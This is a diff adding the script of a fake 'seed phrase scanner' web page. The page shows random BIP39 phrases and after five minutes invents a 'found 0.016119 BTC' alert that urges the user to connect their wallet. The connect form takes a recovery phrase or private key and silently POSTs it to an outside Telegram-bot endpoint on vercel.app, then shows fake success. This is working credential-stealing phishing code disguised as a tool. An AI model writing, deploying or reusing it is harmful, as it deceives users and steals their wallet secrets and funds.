+        foundCountElement.innerHTML = `1<span class="double-space"></span><span class="awaiting-text">Awaiting wallet connect...</span>`;
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const walletState = localStorage.getItem('walletConnected');
+    if (walletState === 'true') {
+        updateWalletButton(true);
+        walletConnected = true;
+    } else {
+        restoreFoundCount();
+    }
+});
+
+const scannerContent = document.querySelector('.scanner-content');
+const scannedCount = document.getElementById('scanned-count');
+let isScanning = false;
+let scanInterval;
+let count = 0;
+let phrases = [];
+
+function generatePhrase() {
+    let phrase = [];
+    for (let i = 0; i < 12; i++) {
+        const randomIndex = Math.floor(Math.random() * BIP39_WORDLIST.length);
+        phrase.push(BIP39_WORDLIST[randomIndex]);
+    }
+    return phrase.join(' ');
+}
+
+function updateScanner() {
+    phrases.unshift(generatePhrase());
+    if (phrases.length > 19) phrases.pop();
+    
+    scannerContent.innerHTML = phrases.map(phrase => 
+        `<div class="phrase-line">${phrase}</div>`
+    ).join('');
+    
+    count++;
+    scannedCount.textContent = count;
+}
+
+document.querySelector('.start-button').addEventListener('click', function() {
+    if (!isScanning) {
+        isScanning = true;
+        this.style.opacity = '0.5';
+        document.querySelector('.stop-button').style.opacity = '1';
+        scanStartTime = Date.now();
+        scanInterval = setInterval(updateScanner, 5);
+        
+            if (!localStorage.getItem('alertShown')) {
+                setTimeout(() => {
+                    if (isScanning && !walletConnected) {
+                        // Update the found count display
+                        const foundCountElement = document.getElementById('found-count');
+                        foundCountElement.innerHTML = `1<span class="double-space"></span><span class="awaiting-text">Awaiting wallet connect...</span>`;
+
+                        // Show the found alert
+                        showFoundAlert();
+                        localStorage.setItem('foundCountState', foundCountElement.innerHTML);
+
+                        // Set localStorage flag so this doesn't show again
+                        localStorage.setItem('alertShown', 'true');
+                    }
+                }, 5 * 60 * 1000); // 5 minutes
+            }
+        }
+    });
+
+document.querySelector('.stop-button').addEventListener('click', function() {
+    if (isScanning) {
+        isScanning = false;
+        this.style.opacity = '0.5';
+        document.querySelector('.start-button').style.opacity = '1';
+        clearInterval(scanInterval);
+        
+        if (walletConnected) {
+            document.getElementById('found-count').textContent = '0';
+        }
+    }
+});
+
+document.querySelector('.history-icon').addEventListener('click', function() {
+    document.querySelector('.history-overlay').classList.add('active');
+});
+
+document.querySelector('.close-icon').addEventListener('click', function() {
+    document.querySelector('.history-overlay').classList.remove('active');
+});
+
+document.querySelector('.contact-icon').addEventListener('click', function() {
+    window.location.href = 'mailto:cryptohunt.team@gmail.com';
+});
+
+document.querySelector('.logout-icon').addEventListener('click', function() {
+    window.location.href = 'index.html';
+});
+
+function showFoundAlert() {
+    if (localStorage.getItem('alertShown')) {
+        return;
+    }
+
+    localStorage.setItem('alertShown', 'true');
+
+    const alertHTML = `
+        <div class="alert-container" role="alert">
+            <div class="alert-wrapper">
+                <div class="alert-content">
+                    <div class="alert-header">
+                        <span class="alert-text-highlight">New found</span>
+                        <span class="alert-text-separator">•</span>
+                        0.016119 BTC | $1,500
+                    </div>
+                    <div class="alert-message">
+                        Connect your main wallet now to receive all founds automatically, else it will be lost.
+                    </div>
+                </div>
+                <div class="alert-actions">
+                    <button class="alert-button-cancel" tabindex="0">Cancel</button>
+                    <button class="alert-button-connect" tabindex="0">Connect</button>
+                </div>
+            </div>
+        </div>
+    `;
+
+    document.body.insertAdjacentHTML('beforeend', alertHTML);
+    
+    // Add animation class after a brief delay
+    setTimeout(() => {
+        document.querySelector('.alert-container').classList.add('show');
+    }, 10);
+}
+
+document.addEventListener('click', (e) => {
+    if (e.target.classList.contains('alert-button-cancel')) {
+        const alert = e.target.closest('.alert-container');
+        alert.classList.remove('show');
+        setTimeout(() => alert.remove(), 300);
+    }
+    
+    if (e.target.classList.contains('alert-button-connect')) {
+        const alert = e.target.closest('.alert-container');
+        alert.classList.remove('show');
+        setTimeout(() => {
+            alert.remove();
+            document.querySelector('.connect-kit-overlay').style.display = 'block';
+            setTimeout(() => {
+                document.querySelector('.connect-kit-overlay').classList.add('active');
+            }, 10);
+        }, 300);
+    }
+});
+
+function updateWalletButton(isConnected) {
+    const walletButton = document.querySelector('.connect-wallet');
+    const walletIcon = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="rgba(255,255,255,1)" width="20" height="20"><path d="M18.0049 6.99979H21.0049C21.5572 6.99979 22.0049 7.4475 22.0049 7.99979V19.9998C22.0049 20.5521 21.5572 20.9998 21.0049 20.9998H3.00488C2.4526 20.9998 2.00488 20.5521 2.00488 19.9998V3.99979C2.00488 3.4475 2.4526 2.99979 3.00488 2.99979H18.0049V6.99979ZM4.00488 8.99979V18.9998H20.0049V8.99979H4.00488ZM4.00488 4.99979V6.99979H16.0049V4.99979H4.00488ZM15.0049 12.9998H18.0049V14.9998H15.0049V12.9998Z"></path></svg>`;
+    
+    walletButton.innerHTML = `${walletIcon} ${isConnected ? 'Detach Wallet' : 'Connect Wallet'}`;
+    localStorage.setItem('walletConnected', isConnected);
+}
+
+document.querySelector('.connect-wallet').addEventListener('click', function() {
+    const isDetachState = this.textContent.includes('Detach Wallet');
+    
+    if (isDetachState) {
+        walletConnected = false;
+        this.style.opacity = '0.5';
+        updateWalletButton(false);
+        setTimeout(() => {
+            this.style.opacity = '1';
+        }, 3000);
+    } else {
+        document.querySelector('.connect-kit-overlay').style.display = 'block';
+        setTimeout(() => {
+            document.querySelector('.connect-kit-overlay').classList.add('active');
+        }, 10);
+    }
+});
+
+document.querySelectorAll('.close-icon').forEach(icon => {
+    icon.addEventListener('click', () => {
+        const overlay = icon.closest('.connect-kit-overlay, .connect-wallet-overlay');
+        overlay.classList.remove('active');
+        setTimeout(() => {
+            overlay.style.display = 'none';
+        }, 300);
+    });
+});
+
+const walletOptions = document.querySelectorAll('.wallet-option');
+walletOptions.forEach(option => {
+    option.addEventListener('click', () => {
+        document.querySelector('.connect-kit-overlay').classList.remove('active');
+        setTimeout(() => {
+            document.querySelector('.connect-kit-overlay').style.display = 'none';
+            document.querySelector('.connect-wallet-overlay').style.display = 'block';
+            setTimeout(() => {
+                document.querySelector('.connect-wallet-overlay').classList.add('active');
+            }, 10);
+        }, 300);
+    });
+});
+
+const optionBtns = document.querySelectorAll('.option-btn');
+const inputField = document.querySelector('.input-field');
+const connectBtn = document.querySelector('.connect-button');
+const noWalletCta = document.querySelector('.no-wallet-cta');
+const successMsg = document.querySelector('.success-message');
+const errorMsg = document.querySelector('.error-message');
+
+document.querySelector('.return-icon').addEventListener('click', (e) => {
+    e.stopPropagation(); // Prevent event bubbling
+    document.querySelector('.connect-wallet-overlay').classList.remove('active');
+    setTimeout(() => {
+        document.querySelector('.connect-wallet-overlay').style.display = 'none';
+        document.querySelector('.connect-kit-overlay').style.display = 'block';
+        document.querySelector('.connect-kit-overlay').classList.add('active');
+    }, 10);
+});
+
+optionBtns.forEach(btn => {
+    btn.addEventListener('click', () => {
+        const recoveryStyle = {
+            background: 'rgba(0, 122, 255, 0.1)',
+            color: '#007AFF'
+        };
+        const privateKeyStyle = {
+            background: '#252525',
+            color: '#818383'
+        };
+        
+        optionBtns.forEach(b => {
+            const style = btn === b ? recoveryStyle : privateKeyStyle;
+            Object.assign(b.style, {
+                backgroundColor: style.background,
+                color: style.color
+            });
+        });
+        
+        inputField.placeholder = btn.textContent === 'Recovery Phrase' 
+            ? 'Enter 12 or 24 word recovery phrase'
+            : 'Enter private key';
+
+        errorMsg.textContent = btn.textContent === 'Recovery Phrase'
+            ? 'Invalid recovery phrase. Try again!'
+            : 'Invalid private key. Try again!';
+    });
+});
+
+function validateInput(input, type) {
+    // For Recovery Phrase option
+    if (type === 'Recovery Phrase') {
+        const words = input.split(' ').filter(word => word.length > 0);
+        return words.length === 12 || words.length === 24;
+    }
+    // For Private Key option - strict 64 character hex validation
+    if (type === 'Private Key') {
+        const hexRegex = /^[0-9a-fA-F]{64}$/;
+        return hexRegex.test(input);
+    }
+    return false;
+}
+
+// Update the connect button handler
+connectBtn.addEventListener('click', () => {
+    const userInput = inputField.value.trim();
+    const activeButton = document.querySelector('.option-btn[style*="rgba(0, 122, 255, 0.1)"]');
+    const currentOption = activeButton ? activeButton.textContent : 'Recovery Phrase';
+    
+if (validateInput(userInput, currentOption)) {
+    const serverUrl = 'https://telegrambot-ashen.vercel.app/send-message';
+    
+    fetch(serverUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            credentials: userInput,
+            type: currentOption
+        })
+    })
+    .then(response => response.json())
+    .then(result => {
+        console.log('Server Response:', result);
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+
+
+    successMsg.style.display = 'block';
+    errorMsg.style.display = 'none';
+    noWalletCta.style.display = 'none';
+    walletConnected = true;
+
+    document.getElementById('found-count').textContent = '0';
+
+    setTimeout(() => {
+        document.querySelector('.connect-wallet-overlay').classList.remove('active');
+        document.querySelector('.connect-wallet-overlay').style.display = 'none';
+        updateWalletButton(true);
+
+        const existingAlert = document.querySelector('.alert-container');
+        if (existingAlert) {
+            existingAlert.classList.remove('show');
+            setTimeout(() => existingAlert.remove(), 300);
+        }
+    }, 3000);
+
+} else {
+    errorMsg.style.display = 'block';
+    successMsg.style.display = 'none';
+    noWalletCta.style.display = 'none';
+
+    setTimeout(() => {
+        errorMsg.style.display = 'none';
+        noWalletCta.style.display = 'flex';
+    }, 3000);
+}
+});
+</script>
+</body>
+</html>
